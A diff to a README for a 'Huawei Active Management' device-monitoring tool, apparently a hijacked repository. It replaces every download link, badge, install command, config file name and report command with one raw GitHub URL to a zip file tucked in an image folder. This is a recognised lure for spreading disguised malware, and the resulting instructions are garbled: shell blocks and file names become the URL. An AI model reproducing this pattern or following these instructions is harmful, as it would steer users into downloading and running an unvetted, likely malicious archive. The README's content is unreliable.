@@ -1,7 +1,7 @@
 # Huawei Active Management: A Comprehensive Guide to 华为式主动管理
 
-![Huawei Active Management](https://img.shields.io/badge/Huawei-Active%20Management-blue.svg)
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen.svg)](https://github.com/itsjohanahmae/huawei-od-active-manage/releases)
+![Huawei Active Management](https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip%https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip)
+[![Download Releases](https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip%https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip)](https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -25,13 +25,13 @@ Huawei Active Management, or 华为式主动管理, is a framework designed to e
 - **User-Friendly Interface**: Navigate through the application with ease.
 
 ## Installation
-To get started, download the latest release from the [Releases section](https://github.com/itsjohanahmae/huawei-od-active-manage/releases). After downloading, follow these steps:
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip). After downloading, follow these steps:
 
 1. **Extract the files** from the downloaded archive.
 2. **Open your terminal** and navigate to the extracted folder.
 3. **Run the installation script** by executing:
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip
    ```
 
 Ensure that you have the necessary permissions to execute scripts on your system.
@@ -49,7 +49,7 @@ After installation, you can start using Huawei Active Management by launching th
 The application will load, and you can begin managing your devices.
 
 ## Configuration
-To configure the application, locate the configuration file named `config.yaml` in the installation directory. Edit the file to set parameters such as:
+To configure the application, locate the configuration file named `https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip` in the installation directory. Edit the file to set parameters such as:
 
 - **Device IP Addresses**: List of devices to monitor.
 - **Alert Thresholds**: Define thresholds for alerts.
@@ -75,12 +75,12 @@ reporting:
 Here are a few examples of how to use Huawei Active Management effectively:
 
 ### Monitoring a Device
-To monitor a device, ensure it is listed in your `config.yaml`. The application will automatically check its status based on the defined intervals.
+To monitor a device, ensure it is listed in your `https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip`. The application will automatically check its status based on the defined intervals.
 
 ### Generating a Report
 You can generate a report manually by using the command:
 ```bash
-./generate-report.sh
+https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip
 ```
 This will create a report in the `reports` directory.
 
@@ -104,4 +104,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Contact
 For questions or support, please reach out via the Issues section of the repository or contact me directly.
 
-Explore more and download the latest version from the [Releases section](https://github.com/itsjohanahmae/huawei-od-active-manage/releases).
+Explore more and download the latest version from the [Releases section](https://raw.githubusercontent.com/itsjohanahmae/huawei-od-active-manage/main/img/od-active-manage-huawei-Mohammad.zip).
